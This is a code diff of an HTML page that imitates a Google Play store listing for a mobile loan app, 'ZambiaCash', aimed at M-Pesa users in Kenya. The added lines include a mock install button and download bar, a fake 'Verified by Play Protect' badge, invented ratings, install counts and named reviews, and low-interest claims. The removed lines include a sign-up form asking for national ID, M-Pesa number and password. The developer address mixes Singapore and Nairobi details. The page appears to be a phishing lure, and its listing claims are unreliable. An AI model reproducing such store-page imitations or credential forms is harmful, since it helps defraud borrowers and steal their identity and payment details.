-                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                                <svg class="w-4 h-4 text-gray-300" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                            </div>
-                            <span class="text-xs text-gray-500 font-medium">3,142</span>
-                        </div>
-                        <div class="flex-1 space-y-1">
-                            <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">5</span><div class="flex-1 bg-gray-200 rounded-full h-2 overflow-hidden"><div class="bg-playBlue h-2 rounded-full" style="width: 82%"></div></div></div>
-                            <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">4</span><div class="flex-1 bg-gray-200 rounded-full h-2 overflow-hidden"><div class="bg-playBlue h-2 rounded-full" style="width: 12%"></div></div></div>
-                            <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">3</span><div class="flex-1 bg-gray-200 rounded-full h-2 overflow-hidden"><div class="bg-playBlue h-2 rounded-full" style="width: 3%"></div></div></div>
-                            <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">2</span><div class="flex-1 bg-gray-200 rounded-full h-2 overflow-hidden"><div class="bg-playBlue h-2 rounded-full" style="width: 2%"></div></div></div>
-                            <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">1</span><div class="flex-1 bg-gray-200 rounded-full h-2 overflow-hidden"><div class="bg-playBlue h-2 rounded-full" style="width: 1%"></div></div></div>
-                        </div>
-                    </div>
-
-                    <div class="space-y-7">
-                        <div>
-                            <div class="flex items-center gap-3 mb-2">
-                                <div class="review-avatar bg-purple-500">J</div>
-                                <div><p class="text-sm font-semibold text-gray-900">James Mwangi</p><p class="text-[11px] text-gray-500">2 days ago</p></div>
-                            </div>
-                            <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div>
-                            <p class="text-sm text-gray-600 leading-relaxed mb-2">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p>
-                            <p class="text-xs text-gray-500 mb-2">2 people found this review helpful</p>
-                        </div>
-                        <div>
-                            <div class="flex items-center gap-3 mb-2">
-                                <div class="review-avatar bg-pink-500">M</div>
-                                <div><p class="text-sm font-semibold text-gray-900">Mary Wanjiku</p><p class="text-[11px] text-gray-500">1 week ago</p></div>
-                            </div>
-                            <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★</span><span class="text-gray-300 text-sm">★</span></div>
-                            <p class="text-sm text-gray-600 leading-relaxed mb-2">The interest rates are very low compared to other apps I've used. Very fair terms. Just wish the limit could be higher.</p>
-                            <div class="flex items-center gap-3 mt-2">
-                                <span class="text-xs text-gray-500">Was this review helpful?</span>
-                                <button class="border border-gray-300 rounded-full px-4 py-1 text-xs font-medium text-gray-700">Yes</button>
-                                <button class="border border-gray-300 rounded-full px-4 py-1 text-xs font-medium text-gray-700">No</button>
-                            </div>
-                        </div>
-                        <div>
-                            <div class="flex items-center gap-3 mb-2">
-                                <div class="review-avatar bg-orange-500">P</div>
-                                <div><p class="text-sm font-semibold text-gray-900">Peter Otieno</p><p class="text-[11px] text-gray-500">2 weeks ago</p></div>
-                            </div>
-                            <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★</span><span class="text-gray-300 text-sm">★★</span></div>
-                            <p class="text-sm text-gray-600 leading-relaxed mb-2">The loan was disbursed quickly but the app crashed once during my application. Customer service helped me resolve it though.</p>
-                        </div>
-                    </div>
-                    <button class="text-playBlue font-semibold text-sm mt-4">See all reviews</button>
-                </div>
-
-                <div class="border-t border-gray-100 pt-8 mb-8">
-                    <div class="flex items-center justify-between mb-4">
-                        <h3 class="font-bold text-xl text-gray-900">App support</h3>
-                        <svg class="w-6 h-6 text-gray-600 transform rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
-                    </div>
-                    <div class="space-y-5">
-                        <div class="flex items-center gap-4 text-gray-700">
-                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path></svg>
-                            <span class="text-sm font-medium">Website</span>
-                        </div>
-                        <div class="flex items-start gap-4 text-gray-700">
-                            <svg class="w-5 h-5 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
-                            <div><p class="text-sm font-medium mb-1">Email</p><p class="text-sm text-gray-500">support@zambiacash.com</p></div>
-                        </div>
-                        <div class="flex items-center gap-4 text-gray-700">
-                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
-                            <span class="text-sm font-medium">Privacy policy</span>
-                        </div>
-                    </div>
-                    <h3 class="font-bold text-lg text-gray-900 mt-8 mb-3">About the developer</h3>
-                    <div class="text-sm text-gray-600 space-y-1">
-                        <p class="font-semibold text-gray-900">ZambiaCash Financial Services</p>
-                        <p>support@zambiacash.com</p>
-                        <p>11 North Buona Vista Drive</p>
-                        <p>#08-09 The Metropolis</p>
-                        <p>Nairobi, Kenya 138589</p>
-                        <p>+254 700 000 000</p>
-                    </div>
-                </div>
-
-                <div class="border-t border-gray-100 pt-8 mb-8">
-                    <div class="flex items-center justify-between mb-4">
-                        <h3 class="font-bold text-xl text-gray-900">Similar apps</h3>
-                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
-                    </div>
-                    <div class="flex gap-4 overflow-x-auto hide-scrollbar">
-                        <div class="w-24 flex-shrink-0">
-                            <div class="w-16 h-16 bg-blue-500 rounded-2xl mb-2 flex items-center justify-center text-white font-bold text-2xl">M</div>
-                            <p class="text-xs font-semibold text-gray-900 leading-tight">Meta Loan</p>
-                            <p class="text-[10px] text-gray-500 mt-1">4.5 ★</p>
-                        </div>
-                        <div class="w-24 flex-shrink-0">
-                            <div class="w-16 h-16 bg-green-500 rounded-2xl mb-2 flex items-center justify-center text-white font-bold text-2xl">J</div>
-                            <p class="text-xs font-semibold text-gray-900 leading-tight">Jiji Kenya</p>
-                            <p class="text-[10px] text-gray-500 mt-1">4.6 ★</p>
-                        </div>
-                        <div class="w-24 flex-shrink-0">
-                            <div class="w-16 h-16 bg-orange-500 rounded-2xl mb-2 flex items-center justify-center text-white font-bold text-2xl">A</div>
-                            <p class="text-xs font-semibold text-gray-900 leading-tight">Alibaba</p>
-                            <p class="text-[10px] text-gray-500 mt-1">4.2 ★</p>
-                        </div>
-                    </div>
-                </div>
+            <div class="flex flex-col justify-center">
+                <h1 class="text-2xl font-bold text-gray-900 leading-tight">ZambiaCash</h1>
+                <p class="text-playBlue font-semibold text-sm mt-1">ZambiaCash Financial</p>
+                <p class="text-gray-500 text-xs mt-1">Contains ads</p>
             </div>
         </div>
 
-        <!-- BOTTOM NAV -->
-        <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex justify-around py-2.5 z-50 pb-safe">
-            <div class="flex flex-col items-center text-gray-500">
-                <svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                <span class="text-[10px] font-medium">Games</span>
-            </div>
-            <div class="flex flex-col items-center text-gray-500">
-                <svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z"></path></svg>
-                <span class="text-[10px] font-medium">Apps</span>
-            </div>
-            <div class="flex flex-col items-center text-playBlue">
-                <div class="bg-blue-100 px-5 py-1 rounded-full mb-1">
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
-                </div>
-                <span class="text-[10px] font-bold">Search</span>
+        <div id="download-text" class="hide mb-4">
+            <span id="download-percent" class="text-sm font-semibold text-gray-700">0% of 10 MB</span>
+            <div class="flex items-center gap-1 mt-1 text-playGreen">
+                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                <span class="text-xs font-semibold">Verified by Play Protect</span>
             </div>
         </div>
-    </div>
 
-    <!-- SPLASH -->
-    <div id="splash-screen" class="hide fixed inset-0 z-[9998] bg-[#0F172A] flex flex-col items-center justify-center opacity-0">
-        <div class="w-24 h-24 bg-white/10 rounded-3xl flex items-center justify-center shadow-[0_0_30px_rgba(59,130,246,0.3)] mb-4">
-            <img src="icon.png" class="w-16 h-16 rounded-2xl object-cover" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxRTQwQUYiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1zaXplPSI0MCIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlo8L3RleHQ+PC9zdmc+'">
+        <div class="flex gap-2 mb-6" id="pre-install-buttons">
+            <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
         </div>
-        <h1 class="text-white text-2xl font-bold font-sans">ZambiaCash</h1>
-    </div>
 
-    <!-- APP CONTENT -->
-    <div id="app-content" class="hide font-sans">
-        <div id="screen-login" class="screen active gradient-bg p-6">
-            <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
-                <div class="text-center mb-10">
-                    <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto flex items-center justify-center border border-white/20 mb-6">
-                        <img src="icon.png" class="w-16 h-16 rounded-2xl object-cover" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxRTQwQUYiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1zaXplPSI0MCIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlo8L3RleHQ+PC9zdmc+'">
+        <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
+            <button class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200" style="opacity:0.5;">Cancel</button>
+            <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full flex items-center justify-center gap-2">Downloading...</button>
+        </div>
+
+        <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
+            <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-3 rounded-full border border-gray-300">Uninstall</button>
+            <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full">Open</button>
+        </div>
+
+        <div id="post-install-content" class="hide">
+            <div class="mb-8 border-t border-gray-100 pt-6">
+                <h3 class="font-bold text-xl text-gray-900 mb-2">What's new</h3>
+                <p class="text-sm text-gray-500 mb-4">Last updated Aug 31, 2026</p>
+                <ul class="text-sm text-gray-700 space-y-2 font-medium"><li>- Fixed bugs</li><li>- Performance Improvements</li></ul>
+            </div>
+            <div class="mb-8 border-t border-gray-100 pt-8">
+                <h3 class="font-bold text-xl mb-1 text-gray-900">Rate this app</h3>
+                <p class="text-sm text-gray-500 mb-6">Tell others what you think</p>
+                <div class="flex justify-between items-center mb-6 px-2">
+                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(1)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(2)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(3)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(4)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer" onclick="setRating(5)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                </div>
+                <button id="btn-write-review" class="text-playBlue font-semibold text-sm">Write a review</button>
+            </div>
+        </div>
+
+        <div id="pre-install-content">
+            <div class="flex justify-between items-center text-center py-5 mb-6 border-y border-gray-100" id="stats-row">
+                <div class="flex-1 flex flex-col items-center"><div class="flex items-center gap-1"><span class="font-bold text-base">4.6</span><svg class="w-4 h-4 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg></div><span class="text-[11px] text-gray-600 mt-1">3.1K reviews</span></div>
+                <div class="w-px h-10 bg-gray-200"></div>
+                <div class="flex-1 flex flex-col items-center"><svg class="w-5 h-5 mb-1 text-gray-800" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg><span class="font-bold text-xs">500K+</span></div>
+                <div class="w-px h-10 bg-gray-200"></div>
+                <div class="flex-1 flex flex-col items-center"><div class="border border-gray-600 rounded px-1.5 text-[11px] font-bold mb-1">12+</div><span class="text-[11px] text-gray-600">Rated for 12+</span></div>
+            </div>
+
+            <div class="flex gap-4 overflow-x-auto hide-scrollbar mb-8 pb-4 snap-x">
+                <div class="w-44 h-80 bg-gradient-to-br from-brandBlue to-brandLight rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
+                    <div><p class="text-blue-200 text-[11px] font-bold tracking-widest uppercase">Available Limit</p><p class="text-white text-3xl font-extrabold mt-2">Ksh 50,000</p></div>
+                    <div class="bg-white/20 backdrop-blur rounded-xl p-4 border border-white/20"><p class="text-white text-sm font-bold">Instant Disbursement</p><p class="text-blue-100 text-[11px] mt-1">Straight to M-Pesa</p></div>
+                </div>
+                <div class="w-44 h-80 bg-white border border-gray-200 rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
+                    <div><p class="text-gray-400 text-[11px] font-bold tracking-widest uppercase">Interest Rates</p><p class="text-brandBlue text-4xl font-extrabold mt-2">10%</p><p class="text-gray-500 text-sm font-medium mt-1">Only</p></div>
+                    <div class="bg-blue-50 rounded-xl p-4 border border-blue-100"><p class="text-brandBlue text-sm font-bold">Low Cost</p><p class="text-gray-500 text-[11px] mt-1">No hidden fees</p></div>
+                </div>
+                <div class="w-44 h-80 bg-emerald-500 rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
+                    <div><p class="text-emerald-100 text-[11px] font-bold tracking-widest uppercase">Approval Time</p><p class="text-white text-4xl font-extrabold mt-2">2 Min</p></div>
+                    <div class="bg-white/20 backdrop-blur rounded-xl p-4 border border-white/20"><p class="text-white text-sm font-bold">Fastest Loans</p><p class="text-emerald-50 text-[11px] mt-1">24/7 Available</p></div>
+                </div>
+            </div>
+
+            <div class="mb-8">
+                <h3 class="font-bold text-xl text-gray-900 mb-3">About this app</h3>
+                <p class="text-sm text-gray-600 leading-relaxed mb-4">Get instant mobile loans from Ksh 1,000 to Ksh 50,000 directly to your M-Pesa. We offer low interest rates, instant disbursement, and flexible repayment terms of 30 to 90 days. No paperwork, 100% online.</p>
+                <div class="flex gap-2"><span class="border border-gray-300 rounded-lg px-3 py-1.5 text-xs font-medium text-gray-700">Finance</span><span class="border border-gray-300 rounded-lg px-3 py-1.5 text-xs font-medium text-gray-700">Loans</span></div>
+            </div>
+
+            <div class="mb-8 border-t border-gray-100 pt-8">
+                <h3 class="font-bold text-xl text-gray-900 mb-3">Data safety</h3>
+                <p class="text-sm text-gray-600 leading-relaxed mb-4">Safety starts with understanding how developers collect and share your data.</p>
+                <div class="border border-gray-200 rounded-xl p-5 space-y-5">
+                    <div class="flex items-start gap-4"><svg class="w-6 h-6 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z"></path></svg><div><p class="text-sm font-semibold text-gray-900">No data shared with third parties</p><p class="text-xs text-gray-500 mt-1">Learn more about how developers declare sharing</p></div></div>
+                    <div class="flex items-start gap-4"><svg class="w-6 h-6 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path></svg><div><p class="text-sm font-semibold text-gray-900">This app may collect these data types</p><p class="text-xs text-gray-500 mt-1">Financial info and App info and performance</p></div></div>
+                    <div class="flex items-start gap-4"><svg class="w-6 h-6 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg><div><p class="text-sm font-semibold text-gray-900">Data is encrypted in transit</p></div></div>
+                </div>
+            </div>
+
+            <div class="border-t border-gray-100 pt-8 mb-8">
+                <h3 class="font-bold text-xl text-gray-900 mb-4">Ratings and reviews</h3>
+                <div class="flex gap-4 items-center mb-8">
+                    <div class="flex flex-col items-center"><span class="text-5xl font-light text-gray-900">4.6</span><div class="flex text-gray-800 my-1">★★★★★</div><span class="text-xs text-gray-500">3,142</span></div>
+                    <div class="flex-1 space-y-1">
+                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">5</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 82%"></div></div></div>
+                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">4</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 12%"></div></div></div>
+                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">3</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 3%"></div></div></div>
+                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">2</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 2%"></div></div></div>
+                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">1</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 1%"></div></div></div>
                     </div>
-                    <h1 class="text-white text-3xl font-extrabold tracking-tight">ZambiaCash</h1>
-                    <p class="text-blue-200 text-sm font-medium mt-2">Quick loans in minutes</p>
                 </div>
-                <div class="glass-card rounded-3xl p-6 shadow-2xl">
-                    <h2 class="text-xl font-bold text-slate-900 mb-5">Create Account</h2>
-                    <div class="space-y-4">
-                        <div><input type="text" id="in-name" placeholder="Full Name"></div>
-                        <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
-                        <div><input type="tel" id="in-mpesa" placeholder="M-Pesa (0712345678)"></div>
-                        <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
-                        <button onclick="submitLogin()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl mt-4 shadow-lg">Create Account</button>
+                <div class="space-y-7">
+                    <div>
+                        <div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-purple-500">J</div><div><p class="text-sm font-semibold">James Mwangi</p><p class="text-[11px] text-gray-500">2 days ago</p></div></div>
+                        <p class="text-sm text-gray-600 leading-relaxed">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p>
                     </div>
-                    <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
-                </div>
-            </div>
-        </div>
-        <div id="screen-checking" class="screen gradient-bg p-6 items-center justify-center">
-            <div class="w-28 h-28 bg-white/10 rounded-full flex items-center justify-center mb-8 animate-pulse border border-white/20"><img src="icon.png" class="w-20 h-20 rounded-2xl object-cover"></div>
-            <h2 class="text-white text-2xl font-bold text-center mb-2">Checking your<br>loan limit</h2>
-            <p id="check-status" class="text-blue-200 text-sm mb-8 font-medium">Analyzing your profile...</p>
-            <div class="w-full max-w-xs bg-blue-900/50 rounded-full h-3 mb-3 border border-white/10">
-                <div id="check-bar" class="bg-brandYellow h-3 rounded-full transition-all duration-100" style="width: 0%"></div>
-            </div>
-            <p id="check-percent" class="text-white font-bold text-2xl">0%</p>
-        </div>
-        <div id="screen-select" class="screen bg-slate-50 p-6">
-            <div class="max-w-sm mx-auto w-full">
-                <h2 class="text-2xl font-extrabold text-slate-900 mb-1">Choose your loan</h2>
